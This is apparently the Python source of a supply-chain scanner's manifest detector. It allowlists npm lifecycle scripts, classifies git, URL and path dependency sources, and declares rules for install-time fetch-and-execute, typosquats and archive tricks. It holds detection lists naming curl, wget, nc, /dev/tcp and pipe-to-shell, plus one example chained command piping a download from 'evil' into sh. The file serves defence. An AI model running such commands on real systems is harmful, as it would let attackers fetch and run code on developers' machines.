"""Manifest inspection: lifecycle scripts and dependency sources.

This detector covers the single most common supply-chain attack: a lifecycle
script added to a package so that arbitrary code runs during installation, as
the developer, before any other control applies.

Two decisions define it.

**The lifecycle check is an allowlist, not a blocklist.** The attack is *adding
a script*, so enumerating known-bad commands is permanently one step behind
whoever writes the next one. Instead, the set of permitted lifecycle entries is
declared and anything else is a finding, including a changed value for a
permitted key.

**The dependency-source check is about mechanism, not intent.** A dependency
resolved from a git URL, an archive URL or a filesystem path may be entirely
legitimate. The point is that none of the ecosystem's own protections apply to
it: no lockfile integrity hash, no advisory matching, no release-age cooldown.
The finding says the safety net is absent, not that something is wrong.
"""

from __future__ import annotations

import posixpath
import re
from typing import TYPE_CHECKING, ClassVar

from cordon_scanner.core import references
from cordon_scanner.core.models import (
    AUTHOR_TIME_HOOKS,
    INSTALL_TIME_HOOKS,
    Capability,
    Category,
    Confidence,
    Evidence,
    EvidenceKind,
    Explanation,
    Finding,
    Location,
    RedactionMode,
    RiskScore,
    Scope,
    Severity,
)
from cordon_scanner.core.redact import Redactor
from cordon_scanner.core.scoring import ScoringContext
from cordon_scanner.detect.base import BaseDetector, DetectorRequirements, FileUnit, ScanContext
from cordon_scanner.detect.catalogue import DeclaredRule
from cordon_scanner.detect.secrets import FIXTURE_CEILING, SourcePaths
from cordon_scanner.ecosystems.registry import EcosystemRegistry

if TYPE_CHECKING:
    from collections.abc import Iterable

    from cordon_scanner.detect.base import Unit
    from cordon_scanner.ecosystems.base import DeclaredDependency, Manifest

MUTABLE_REF_RULE = "POLICY.DEPENDENCY.MUTABLE_REF.001"
SOURCE_PRIORITY_RULE = "SUSPECT.DEPENDENCY.SOURCE_PRIORITY.001"
WRAPPER_RULE = "POLICY.BUILD.WRAPPER_UNVERIFIED.001"
CLEARTEXT_SOURCE_RULE = "POLICY.DEPENDENCY.CLEARTEXT_SOURCE.001"
_FULL_COMMIT = re.compile(r"(?<![0-9a-fA-F])(?:[0-9a-fA-F]{40}|[0-9a-fA-F]{64})(?![0-9a-fA-F])")


class DeclaredSource:
    """What a non-registry specification points at.

    ```
      inside    a path within this repository (file:, link:, portal:, workspace:, ./, ../)
      outside   a path that leaves the repository, or an absolute one
      pinned    a git reference to a full commit SHA: immutable
      mutable   a git reference to a branch, a tag or nothing: a push re-points it
      url       a download URL (an archive, a tarball)
    ```
    """

    GIT = ("git+", "git:", "git@", "github:", "gitlab:", "bitbucket:", "ssh://", "gist:")

    @staticmethod
    def kind(spec: str, manifest_path: str) -> str:
        text = spec.strip()
        lowered = text.lower()
        if lowered.startswith("workspace:"):
            return "inside"
        path: str | None = None
        for prefix in ("file:", "link:", "portal:", "path:"):
            if lowered.startswith(prefix):
                path = text[len(prefix) :]
                break
        else:
            if lowered.startswith(("./", "../", "/", "~")):
                path = text
        if path is not None:
            if path.startswith(("/", "~")):
                return "outside"
            base = manifest_path.rpartition("/")[0]
            joined = posixpath.normpath(posixpath.join(base, path) if base else path)
            return "outside" if joined == ".." or joined.startswith("../") else "inside"
        # `.git` as a path's suffix, not as a substring: `raw.githubusercontent.com` is not a git
        # URL, and read as one, a pinned raw file was reported as a movable git reference.
        is_git = (
            lowered.startswith(DeclaredSource.GIT)
            or re.search(r"\.git(?:$|[#/@?])", lowered)
            or re.match(r"^[\w.-]+/[\w.-]+(?:#.*)?$", lowered)
        )
        if is_git:
            return "pinned" if _FULL_COMMIT.search(text) else "mutable"
        return "url"


# Commands that in a lifecycle script are, on their own, sufficient evidence.
# Every entry either fetches and runs remote content, reads credentials, or
# opens a shell. None has a legitimate purpose in code that executes silently
# during `install`.
HOSTILE_IN_LIFECYCLE = (
    ("curl", Capability.EGRESS),
    ("wget", Capability.EGRESS),
    ("nc ", Capability.EGRESS),
    ("Invoke-WebRequest", Capability.EGRESS),
    ("base64", Capability.DECODE),
    ("eval", Capability.EXECUTE),
    ("node -e", Capability.EXECUTE),
    ("python -c", Capability.EXECUTE),
    ("bash -c", Capability.SPAWN),
    ("sh -c", Capability.SPAWN),
    ("/dev/tcp", Capability.EGRESS),
    ("chmod +x", Capability.PERSIST),
)

PIPE_TO_SHELL = ("| sh", "|sh", "| bash", "|bash", "| python", "|python")

# The lifecycle-name sets live in `core.models`, because the engine reads them too:
# see `AUTHOR_TIME_HOOKS` there for why the script an author-time hook names is not an
# install-hook path.

SAFE_LIFECYCLE_PREFIXES = (
    "node-gyp",
    "prebuild-install",
    "node-pre-gyp",
    "prebuildify",
    "tsc",
    "npm run build",
    "yarn build",
    "pnpm build",
    "husky install",
    "husky",
    "patch-package",
    "opencollective",
    "is-ci",
    "cmake-js",
    "neon build",
    "electron-builder install-app-deps",
)
"""Commands a lifecycle script may run without raising anything.

An allowlist, because the attack is *adding a script*, not putting a particular
word in one. The check used to be a blocklist of hostile substrings, and its own
docstring said otherwise -- so `postinstall: node ./scripts/setup.js`, the single
most common npm attack shape, produced no finding at all. That is the failure
this project names as unacceptable: a control that reads as protective while
doing nothing.

Short on purpose. Native compilation and a TypeScript build are the honest
reasons to run at install time; everything else is a script somebody should look
at, which is what the finding says. An entry here is a decision that a command
needs no review, so the list stays small enough to read.
"""


#: Directories whose manifests belong to somebody else.
#:
#: The distinction this rule was missing, and the reason it was calibrated for one
#: case and only ever fired on the other. An install script in a DEPENDENCY'S
#: manifest is code the project did not write, arriving through a lockfile,
#: running automatically on install: that is the npm attack shape, and it earns
#: high severity. An install script in the project's OWN root manifest is code
#: somebody here wrote, in the file every pull request touches, usually running a
#: script a few directories away in the same repository.
#:
#: Both were reported at high, which is backwards in practice, because
#: `node_modules` is pruned by default -- so in ordinary use the only manifests
#: this rule ever sees are first-party ones. It reported six high-severity
#: findings across three repositories for `"preinstall": "node
#: scripts/security/only-pnpm.mjs"`, a script whose entire purpose is to refuse an
#: install from the wrong package manager, and fifty-five in an Office add-in.
VENDORED_DIRECTORIES = (
    "node_modules",
    "bower_components",
    "vendor",
    "site-packages",
    "dist-packages",
    ".venv",
    "venv",
    "Pods",
    "Carthage",
    ".cargo",
    ".gradle",
    ".m2",
    ".nuget",
    "gems",
)


class ManifestScripts:
    """Whose manifest this is, and what its lifecycle commands run."""

    @staticmethod
    def _is_vendored(path: str) -> bool:
        """Whether this manifest belongs to an installed dependency rather than here."""
        segments = path.replace("\\", "/").split("/")
        return any(segment in VENDORED_DIRECTORIES for segment in segments)

    @staticmethod
    def _is_first_party(path: str, ctx: ScanContext) -> bool:
        """Whether this manifest is the scanned project's own.

        Two conditions, and both took a corpus failure to get right.

        The manifest must not be under a dependency directory, and the scan target must
        BE a git repository root.

        Vendoring alone is not enough, because the case that matters most has no vendor
        directory in it: a published package, an sdist, a downloaded tarball. There the
        hostile manifest IS the root manifest, and three malicious samples in this
        project's own corpus are exactly that shape -- `acme-telemetry`, built to look
        like a real npm compromise, went from high to low on the path test alone.

        `is_git` was the obvious second condition and is the wrong one. It answers
        "is there a repository above this", so scanning
        `corpus/malicious/acme-telemetry` from inside a checkout answers yes, and every
        downloaded package or extracted archive examined anywhere inside any repository
        reads as first-party. The question is whether the thing handed to the scanner is
        the working tree itself, which is what `scanned_repository_root` records.

        What the downgrade gives up is nothing, and the same corpus sample proves it:
        `acme-telemetry` declares three CRITICAL findings besides the install-script
        one, because the script the manifest points at is read by the content detectors
        on its own merits. The manifest finding is a pointer at a file. The file is
        where the answer is.
        """
        if ManifestScripts._is_vendored(path):
            return False
        return bool(ctx.repository is not None and ctx.repository.scanned_repository_root)

    @staticmethod
    def _targets_in_tree(
        command: str, known: frozenset[str], manifest_path: str = ""
    ) -> tuple[str, ...]:
        """Files in this repository that the command runs.

        A first-party install script that runs a file in the same repository is a
        different proposition from one that runs something opaque. The file is tracked,
        was reviewed when it landed, and -- the part that matters most here -- is being
        scanned by every content detector in this same run. Reporting the manifest at
        high severity for pointing at a file the scanner has already read and cleared
        says nothing the reader can act on.

        `ctx.install_hook_paths` is the engine's own resolution of every install hook
        to the in-tree files it reaches, so this asks a question that has already been
        answered rather than parsing shell a second time and disagreeing about it.
        """
        if not known:
            return ()
        tokens = {
            token.strip("\"'`()").lstrip("./")
            for token in re.split(r"[\s;|&]+", command)
            if token.strip()
        }
        # Relative to the manifest, as the package manager runs it: `node install.js` in
        # `esbuild.tgz!package/package.json` is `esbuild.tgz!package/install.js`.
        base = manifest_path.rpartition("/")[0]
        if base:
            tokens |= {posixpath.normpath(f"{base}/{token}") for token in list(tokens) if token}
        # Node resolves `./postinstall` to `postinstall.js` and friends.
        tokens |= {
            f"{token}{suffix}"
            for token in list(tokens)
            if token and "." not in posixpath.basename(token)
            for suffix in (".js", ".cjs", ".mjs", "/index.js")
        }
        return tuple(
            sorted(path for path in known if path in tokens or path.lstrip("./") in tokens)
        )

    @staticmethod
    def _prints_only(command: str) -> bool:
        """Whether every interpreter one-liner in this command only talks or exits.

        Conservative in the direction that matters. A command with no extractable `-e`/`-c`
        program is not inert; any substring from `NOT_INERT` disqualifies the whole command;
        and every call the program makes has to be one of the printing or exiting ones, so a
        program that prints AND does something else is not excused.
        """
        programs = [
            next((group for group in match.groups() if group), "")
            for match in ONE_LINER_PROGRAM.finditer(command)
        ]
        if not programs:
            return False
        if any(marker in command for marker in NOT_INERT):
            return False
        for body in programs:
            if not body:
                return False
            calls = ANY_CALL.findall(body)
            inert = INERT_CALL.findall(body)
            if len(calls) != len(inert):
                return False
        return True

    @staticmethod
    def _is_safe_lifecycle(command: str) -> bool:
        """Whether a lifecycle command is a recognised build step.

        Compared against the whole command after stripping shell chaining, so
        `node-gyp rebuild && curl evil | sh` is not waved through by its first
        clause -- which is how an allowlist that matched a prefix of the raw string
        would have been defeated in one move.
        """
        parts = [p.strip() for p in re.split(r"&&|\|\||;|\||\n", command) if p.strip()]
        if not parts:
            return False
        return all(
            any(part == safe or part.startswith(f"{safe} ") for safe in SAFE_LIFECYCLE_PREFIXES)
            for part in parts
        )


_REQUIRE_ONLY = re.compile(
    r"""^node\s{1,4}-e\s{1,4}["']\s{0,4}(?:try\s{0,4}\{\s{0,4})?require\(\s{0,4}['"](?P<path>\.{1,2}/[^'"\s]{1,200})['"]\s{0,4}\)\s{0,4};?"""
    r"""\s{0,4}(?:\}\s{0,4}catch\s{0,4}(?:\(\s{0,4}\w{0,20}\s{0,4}\))?\s{0,4}\{\s{0,4}\}\s{0,4})?["']$"""
)
"""`node -e "try{require('./postinstall')}catch(e){}"`: an inline command that only loads a file."""

READABLE_HOOK_TARGETS = frozenset(
    {"js", "cjs", "mjs", "ts", "py", "sh", "bash", "rb", "pl", "php", "ps1"}
)
"""Hook targets the content detectors read as source. A binary or extensionless executable is not."""


#: What a one-liner does when all it does is talk.
#:
#: `node -e` and `python -c` are in `HOSTILE_IN_LIFECYCLE` because they take a string
#: and run it, which is the shape every second-stage loader uses. They are also how a
#: package prints a message or declines to install:
#:
#:     "preinstall": "node -e 'process.exit(0)'"
#:
#: is `electron`'s, and it exists to make `npm install` fail so that people use yarn.
#: `OpenHands` uses the same construct to print a welcome message naming the command to
#: run next. Two of the largest repositories in the corpus, both reported at HIGH for a
#: program whose entire effect is a line of text.
#:
#: The engine already draws this distinction for hook PATHS -- `PRINTING_COMMANDS` and
#: `Engine._runs` strip printer segments before resolving what a lifecycle script
#: reaches -- and the manifest detector had no equivalent for the program inside a `-e`.
INERT_CALL = re.compile(
    r"(?:console\s*\.\s*(?:log|info|warn|error|debug)"
    r"|process\s*\.\s*(?:stdout|stderr)\s*\.\s*write"
    r"|process\s*\.\s*exit"
    r"|sys\s*\.\s*stdout\s*\.\s*write"
    r"|sys\s*\.\s*exit"
    r"|print)\s*\("
)
"""A call that writes a message or ends the process, and does nothing else."""

ANY_CALL = re.compile(r"[A-Za-z_$][\w.$\[\]'\"]*\s*\(")
"""Anything that looks like a call, so the inert ones can be counted against the total."""

NOT_INERT = (
    "require(",
    "import(",
    "exec",
    "spawn",
    "fork(",
    "child_process",
    "readFile",
    "writeFile",
    "fs.",
    "os.",
    "subprocess",
    "urllib",
    "fetch(",
    "http",
    "curl",
    "wget",
    "eval(",
    "Function(",
    "atob",
    "b64decode",
    "Buffer.from",
)
"""Calls that mean a one-liner does something beyond talking.

Checked as substrings and deliberately short: any of these and the program is doing
work, whatever else it also prints. `cherry-studio`'s `prepare` installs a git hook with
`require('child_process').execSync('prek install')`, which is exactly the case this must
not excuse.
"""

ONE_LINER_PROGRAM = re.compile(
    r"(?:-e|-c)\s{1,4}(?:'([^']{0,400})'|\"([^\"]{0,400})\"|(\S{1,400}))"
)
"""The program a `-e` or `-c` flag supplies.

Bounded at every repeat, and the double-quoted form takes no escape alternation. The
first draft handled `\\"` with an alternation under a `*`, which the pattern validator
refused as an unbounded quantifier over a group containing one -- the textbook
catastrophic-backtracking shape, and the third time in this pass that the validator
caught an engine pattern a rule pack would have been refused for.

Nothing is lost by dropping the escape handling: a command reaches here already
decoded from the manifest's JSON, so an inner quote is a literal one and the class
stops at it. Four hundred characters is past any lifecycle one-liner anybody writes,
and a longer one simply does not match -- which reports it, the safe direction.
"""


class ManifestDetector(BaseDetector):
    """Inspects dependency manifests."""

    id = "manifest"
    version = "0.5.0"
    categories = frozenset(
        {Category.MALICIOUS, Category.SUSPICIOUS, Category.POLICY, Category.OPERATIONAL}
    )
    requires = DetectorRequirements(content=True)

    @staticmethod
    def declared_rules() -> tuple[DeclaredRule, ...]:
        return (
            DeclaredRule(
                id=CLEARTEXT_SOURCE_RULE,
                title="Package source over plain HTTP",
                severity=Severity.MEDIUM,
                confidence=Confidence.CONFIRMED,
                category=Category.POLICY,
                detector="manifest",
                message=(
                    "A repository or index is reached over http://, so anyone on the network path "
                    "can serve the packages the build installs."
                ),
                references=(
                    references.CLEARTEXT_TRANSMISSION,
                    references.DOWNLOAD_WITHOUT_INTEGRITY_CHECK,
                ),
                remediation="Use an https:// URL for the source.",
            ),
            DeclaredRule(
                id="POLICY.CONTAINER.UNPINNED_BASE.001",
                title="Base image referenced by tag rather than digest",
                severity=Severity.LOW,
                confidence=Confidence.HIGH,
                category=Category.POLICY,
                detector="manifest",
                message=(
                    "The base image is pinned by tag. A tag is mutable, so two builds of the "
                    "same Dockerfile can produce different images, and a rebuild can pull "
                    "content nobody reviewed."
                ),
                references=(
                    references.DOCKER_BUILD_BEST_PRACTICE,
                    references.OPENSSF_SCORECARD_PINNED,
                ),
                remediation="Pin by digest: FROM image:tag@sha256:...",
            ),
            DeclaredRule(
                id="POLICY.CONTAINER.UNPINNED_WORKLOAD_IMAGE.001",
                title="Kubernetes workload runs an image by tag rather than digest",
                severity=Severity.LOW,
                confidence=Confidence.HIGH,
                category=Category.POLICY,
                detector="manifest",
                message=(
                    "A container in this manifest names its image by tag. Each node pulls the tag "
                    "when it schedules the pod, so replicas of one Deployment can run different "
                    "images, and a re-pushed tag reaches production with no change to the manifest."
                ),
                references=(references.OPENSSF_SCORECARD_PINNED,),
                remediation="Pin by digest: image: registry/name:tag@sha256:..., or set the digest through Kustomize's images: field.",
            ),
            DeclaredRule(
                id=WRAPPER_RULE,
                title="Build wrapper downloads its tool without a checksum",
                severity=Severity.LOW,
                confidence=Confidence.CONFIRMED,
                category=Category.POLICY,
                detector="manifest",
                message=(
                    "A Maven or Gradle wrapper fetches the build tool from a URL and runs it, with "
                    "no checksum pinned to refuse a different download."
                ),
                references=(references.DOWNLOAD_WITHOUT_INTEGRITY_CHECK,),
                remediation="Pin `distributionSha256Sum` in the wrapper properties.",
            ),
            DeclaredRule(
                id="SUSPECT.HELM.UNTRUSTED_REPOSITORY.001",
                title="Chart depends on a chart from an unpinned or plain-HTTP repository",
                severity=Severity.MEDIUM,
                confidence=Confidence.MEDIUM,
                category=Category.SUSPICIOUS,
                detector="manifest",
                message=(
                    "This chart pulls a dependency over plain HTTP, or with no version at all. Chart "
                    "dependencies are rendered into the manifests applied to the cluster, so whoever "
                    "controls that repository controls what runs."
                ),
                references=(
                    references.DOWNLOAD_WITHOUT_INTEGRITY_CHECK,
                    references.CLEARTEXT_TRANSMISSION,
                ),
                remediation="Use HTTPS, pin each dependency to a version, and prefer a repository the organisation controls or mirrors.",
            ),
            DeclaredRule(
                id=SOURCE_PRIORITY_RULE,
                title="A private package index merged with a public one",
                severity=Severity.MEDIUM,
                confidence=Confidence.HIGH,
                category=Category.SUSPICIOUS,
                detector="manifest",
                message=(
                    "The project resolves from a private index and a public one together, and the "
                    "resolver takes the highest version either offers: an internal name published "
                    "publicly at a higher version is installed instead."
                ),
                references=(references.DOWNLOAD_WITHOUT_INTEGRITY_CHECK,),
                remediation="Resolve through one index, or pin internal packages to their index.",
            ),
            DeclaredRule(
                id=MUTABLE_REF_RULE,
                title="Git dependency on a reference that can move",
                severity=Severity.MEDIUM,
                confidence=Confidence.CONFIRMED,
                category=Category.POLICY,
                detector="manifest",
                message=(
                    "A dependency is declared from git at a branch, a tag or no reference: a push "
                    "re-points it, so what installs can differ from what was reviewed."
                ),
                references=(references.DOWNLOAD_WITHOUT_INTEGRITY_CHECK,),
                remediation="Pin it to a full commit SHA, or depend on a registry release.",
            ),
            DeclaredRule(
                id="SUSPECT.INSTALL.UNEXAMINED.001",
                title="Install-time code too large or slow to examine",
                severity=Severity.HIGH,
                confidence=Confidence.HIGH,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                message=(
                    "A file that runs at install was truncated or ran out of its time budget, so "
                    "part of it was never examined. Install scripts are kilobytes; one padded past "
                    "the limits keeps its payload out of reach."
                ),
                references=(references.OBSCURED_SECURITY_DATA,),
                remediation="Read the file in full before installing; raise the scan limits to examine it.",
            ),
            DeclaredRule(
                id="SUSPECT.RELEASE.NEW_INSTALL_HOOK.001",
                title="This release runs code at install that the previous release did not",
                severity=Severity.HIGH,
                confidence=Confidence.MEDIUM,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                message="This release runs code at install that the previous release did not, compared with the release before it (`--compare-with`, or `--online` for a published artefact).",
                references=(references.OBSCURED_SECURITY_DATA,),
                remediation="Read what changed between the two releases before installing this one.",
            ),
            DeclaredRule(
                id="SUSPECT.RELEASE.NEW_CAPABILITY.001",
                title="This release's flagged code gains network, process or execution capability",
                severity=Severity.HIGH,
                confidence=Confidence.MEDIUM,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                message="This release's flagged code gains network, process or execution capability, compared with the release before it (`--compare-with`, or `--online` for a published artefact).",
                references=(references.OBSCURED_SECURITY_DATA,),
                remediation="Read what changed between the two releases before installing this one.",
            ),
            DeclaredRule(
                id="SUSPECT.RELEASE.NEW_OBFUSCATION.001",
                title="This release ships obfuscated code where the previous shipped none",
                severity=Severity.HIGH,
                confidence=Confidence.MEDIUM,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                message="This release ships obfuscated code where the previous shipped none, compared with the release before it (`--compare-with`, or `--online` for a published artefact).",
                references=(references.OBSCURED_SECURITY_DATA,),
                remediation="Read what changed between the two releases before installing this one.",
            ),
            DeclaredRule(
                id="SUSPECT.RELEASE.NEW_BINARY.001",
                title="This release adds compiled files",
                severity=Severity.MEDIUM,
                confidence=Confidence.MEDIUM,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                message="This release adds compiled files, compared with the release before it (`--compare-with`, or `--online` for a published artefact).",
                references=(references.OBSCURED_SECURITY_DATA,),
                remediation="Read what changed between the two releases before installing this one.",
            ),
            DeclaredRule(
                id="SUSPECT.PACKAGE.MANIFEST_CONFUSION.001",
                title="The manifest npm serves is not the package.json in the tarball",
                severity=Severity.HIGH,
                confidence=Confidence.HIGH,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                message=(
                    "The registry's copy of the manifest disagrees with the tarball's own package.json "
                    "on install scripts, dependencies, commands, name or version (`--online`, for a "
                    "published npm tarball). npm installs from the tarball, so the registry's view hides "
                    "what runs; critical when the difference is an install script."
                ),
                references=(references.OBSCURED_SECURITY_DATA,),
                remediation="Do not install this version; read the tarball's package.json and report the package.",
            ),
            DeclaredRule(
                id="SUSPECT.RELEASE.NEW_PUBLISHER.001",
                title="This release was published by a different account than the previous one",
                severity=Severity.MEDIUM,
                confidence=Confidence.MEDIUM,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                message="This release was published by a different account than the previous one, compared with the release before it (`--compare-with`, or `--online` for a published artefact).",
                references=(references.OBSCURED_SECURITY_DATA,),
                remediation="Read what changed between the two releases before installing this one.",
            ),
            DeclaredRule(
                id="MALWARE.PACKAGE.KNOWN.001",
                title="The scanned package is a recorded malicious release",
                severity=Severity.CRITICAL,
                confidence=Confidence.CONFIRMED,
                category=Category.MALICIOUS,
                detector="advisory",
                message="The package's own manifest names a release the malicious-package records list.",
                references=(references.OBSCURED_SECURITY_DATA,),
                remediation="Do not install it; treat any machine that did as compromised.",
            ),
            DeclaredRule(
                id="SUSPECT.ARCHIVE.PATH_ESCAPE.001",
                title="Archive member named to write outside the archive",
                severity=Severity.HIGH,
                confidence=Confidence.HIGH,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                message="An archive member's name is absolute or climbs out with `..`.",
                references=(references.OBSCURED_SECURITY_DATA,),
                remediation="Do not unpack or install it.",
            ),
            DeclaredRule(
                id="SUSPECT.ARCHIVE.POLYGLOT.001",
                title="Archive that is a tarball and a zip at once",
                severity=Severity.HIGH,
                confidence=Confidence.HIGH,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                message="The file begins as a tar or compressed stream and ends as a zip, so different tools read different contents.",
                references=(references.OBSCURED_SECURITY_DATA,),
                remediation="Do not install it.",
            ),
            DeclaredRule(
                id="SUSPECT.ARCHIVE.NESTING.001",
                title="Archives nested past the depth the scan opens",
                severity=Severity.HIGH,
                confidence=Confidence.HIGH,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                message="The innermost archive was never examined; depth past two levels keeps a payload out of reach.",
                references=(references.OBSCURED_SECURITY_DATA,),
                remediation="Raise limits.max_archive_depth and examine the inner archives before installing.",
            ),
            DeclaredRule(
                id="SUSPECT.BINARY.NATIVE_IN_PURE_WHEEL.001",
                title="A pure-Python wheel loads a native library it carries",
                severity=Severity.HIGH,
                confidence=Confidence.HIGH,
                category=Category.SUSPICIOUS,
                detector="binary",
                message=(
                    "The wheel is tagged none-any, declaring no compiled code, and loads a native "
                    "library shipped inside it into the interpreter with ctypes."
                ),
                references=(references.OBSCURED_SECURITY_DATA,),
                remediation="Do not install it; genuine native code ships as platform wheels.",
            ),
            DeclaredRule(
                id="SUSPECT.TYPOSQUAT.PACKAGE_NAME.001",
                title="Package is named like a popular package",
                severity=Severity.HIGH,
                confidence=Confidence.MEDIUM,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                message=(
                    "The scanned package's own name is one slip from a widely used package and "
                    "is not itself established: the shape of a typosquat waiting for the typo. "
                    "HIGH for a published artefact, MEDIUM for a working tree."
                ),
                references=(references.DEPENDENCY_CONFUSION,),
                remediation="Install the package that was meant, and report this one.",
            ),
            DeclaredRule(
                id="MALWARE.INSTALL.FETCH_EXEC.001",
                title="Install script fetches and executes remote content",
                severity=Severity.CRITICAL,
                confidence=Confidence.HIGH,
                category=Category.MALICIOUS,
                detector=ManifestDetector.id,
                message=(
                    "An install-time script downloads something and runs it. Install hooks run "
                    "unprompted, as the developer, with the developer's full environment, "
                    "before any test, review, container boundary or network policy applies -- "
                    "and what runs is decided at install time by whoever serves the URL."
                ),
                references=(references.DOWNLOAD_WITHOUT_INTEGRITY_CHECK, references.NPM_LIFECYCLE),
                remediation="Treat the host as compromised. Do not install this package.",
            ),
            DeclaredRule(
                id="SUSPECT.INSTALL.SCRIPT.001",
                title="Package declares an install-time lifecycle script",
                # HIGH, which is the most this rule reports. It declared LOW, and the
                # code has always reported HIGH for a DEPENDENCY's install script --
                # `_lifecycle_findings` grades by whose manifest it is -- so the one
                # severity a reader could check in `rules list` was not the one that
                # decided whether their build failed.
                #
                # Raised rather than capped, because the grading is right: a lifecycle
                # script in code this project did not write runs on the developer's
                # machine, unprompted, before any review. What was wrong was the
                # declaration. `POLICY.LOCKFILE.INTEGRITY.001` had the same divergence
                # and was resolved the other way, because there the declared severity
                # was the defensible one.
                #
                # A declaration is a promise about the maximum. Reporting LOWER than
                # declared is what every ceiling in this tool does and is fine;
                # reporting higher is misinformation.
                severity=Severity.HIGH,
                confidence=Confidence.HIGH,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                message=(
                    "This package runs a script during installation. That is ordinary for "
                    "packages that compile something and it is also the single most used "
                    "foothold in published malware, because the code runs before anything "
                    "inspects the package."
                ),
                references=(references.NPM_LIFECYCLE,),
                remediation="Read the script. Install hooks run before any review or test.",
            ),
        )

    def applicable(self, ctx: ScanContext) -> bool:
        return True

    def inspect(self, unit: Unit, ctx: ScanContext) -> Iterable[Finding]:
        if not isinstance(unit, FileUnit):
            return ()

        ecosystem_id = EcosystemRegistry.manifest_ecosystem(unit.path)
        if ecosystem_id is None:
            return ()

        ecosystem = EcosystemRegistry.get(ecosystem_id)
        if ecosystem is None:
            return ()

        manifest = ecosystem.parse_manifest(unit.content)
        hooks_from_tree = getattr(ecosystem, "hooks_from_tree", None)
        if hooks_from_tree is not None:
            # Install-time code that is a file beside the manifest rather than a field in it (an R
            # package's `configure`, a Dart package's `hook/build.dart`), seen from the tree's paths.
            manifest = hooks_from_tree(manifest, ctx.tree_paths)

        if manifest.parse_error:
            # A manifest that could not be read is a manifest whose contents
            # were not checked. Reporting it keeps that from resembling a pass.
            return [
                self._operational(
                    unit.path,
                    f"Could not parse this {ecosystem_id} manifest, so its "
                    f"lifecycle scripts and dependency sources were not "
                    f"checked: {manifest.parse_error}",
                )
            ]

        findings: list[Finding] = []
        findings.extend(self._lifecycle_findings(manifest, unit, ctx))
        findings.extend(self._source_findings(manifest, unit, ctx))
        findings.extend(self._own_name_findings(manifest, unit, ctx, ecosystem_id))
        findings.extend(self._wrapper_findings(unit, ctx))
        return findings

    def _wrapper_findings(self, unit: FileUnit, ctx: ScanContext) -> Iterable[Finding]:
        """A build wrapper that downloads its tool without a pinned checksum.

        `./mvnw` and `./gradlew` fetch a Maven or Gradle distribution from `distributionUrl` and
        run it for every build, on every machine. With `distributionSha256Sum` set the wrapper
        refuses a download that does not match; without it, whatever that URL serves runs."""
        name = unit.path.rpartition("/")[2]
        if name not in ("maven-wrapper.properties", "gradle-wrapper.properties"):
            return
        values = {
            line.partition("=")[0].strip(): line.partition("=")[2].strip()
            for line in unit.content.text.splitlines()
            if "=" in line and not line.lstrip().startswith(("#", "!"))
        }
        if not values.get("distributionUrl") or values.get("distributionSha256Sum"):
            return
        tool = "Maven" if name.startswith("maven") else "Gradle"
        yield self._finding(
            rule_id=WRAPPER_RULE,
            category=Category.POLICY,
            severity=Severity.LOW,
            confidence=Confidence.CONFIRMED,
            title=f"{tool} wrapper downloads the build tool without a checksum",
            message=(
                f"{unit.path} names a {tool} distribution to download and run for every build, and "
                f"pins no `distributionSha256Sum`: whatever the URL serves is what builds this project."
            ),
            remediation=f"Add `distributionSha256Sum` (the {tool} project publishes it beside each distribution).",
            unit=unit,
            ctx=ctx,
            detail="distributionUrl without distributionSha256Sum",
            capabilities=(),
            reasons=["build tool fetched unverified"],
        )

    def _own_name_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext, ecosystem_id: str
    ) -> Iterable[Finding]:
        """A package whose own name is a slip of a popular one.

        The dependency check asks this of what a project installs; a scanned package is asked
        of itself. `aiiohttp`, `cryptograohy` and `botocote` are published with nothing in
        them but the name, waiting for the typo -- there is no code to find, and the name is the
        whole of the evidence.
        """
        from cordon_scanner.detect.dependency import DependencyDetector
        from cordon_scanner.intel.popular import PackageIntel

        if not manifest.name or "node_modules/" in f"/{unit.path}" or "site-packages/" in unit.path:
            return
        ecosystem = EcosystemRegistry.get(ecosystem_id)
        if ecosystem is None:
            return
        name = ecosystem.normalize_name(manifest.name)
        if PackageIntel.is_known_package(ecosystem_id, name):
            return
        target = DependencyDetector._typosquat_target(ecosystem_id, name)
        if target is None:
            return
        # A published artefact: the archive scanned as one, an npm tarball's `package/`, or an
        # extracted sdist, whose root is `<name>-<version>/` by the format's own convention.
        directory = posixpath.basename(unit.path.rpartition("!")[2].rpartition("/")[0])
        sdist_root = re.fullmatch(
            rf"{re.escape(name).replace('-', '[-_.]')}-\d[\w.+!-]{{0,40}}",
            directory.lower().replace("_", "-"),
        )
        published = (
            ctx.package_distribution
            or sdist_root is not None
            or unit.path.rpartition("!")[2] == "package/package.json"
        )
        yield self._finding(
            rule_id="SUSPECT.TYPOSQUAT.PACKAGE_NAME.001",
            category=Category.SUSPICIOUS,
            severity=Severity.HIGH if published else Severity.MEDIUM,
            confidence=Confidence.MEDIUM,
            title="Package is named like a popular package",
            message=(
                f"This package calls itself {manifest.name!r}, one slip from the widely used "
                f"{target!r}, and is not itself an established package. A published package "
                f"under a name like this collects the installs meant for the other."
            ),
            remediation=f"Install {target!r} if that is what was meant, and report this one.",
            unit=unit,
            ctx=ctx,
            detail=f"{manifest.name} ~ {target}",
            capabilities=[],
            reasons=[f"one edit from {target}"],
        )

    # -- Lifecycle scripts -----------------------------------------------

    def _lifecycle_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        if manifest.ecosystem == "image":
            # A Dockerfile's RUN steps are the project's own build, judged by the Dockerfile rules
            # that read them in context (a fetched script piped to a shell, sudo, a remote ADD).
            # Listed as build hooks; graded as a dependency's install script, each was reported twice.
            return
        for hook in manifest.hooks:
            command = hook.command
            if not command:
                continue
            loader = _REQUIRE_ONLY.match(command.strip())
            if loader:
                # A one-liner whose only act is to load a file beside the manifest is that file,
                # run: graded by what the file is, as `node <file>` would be.
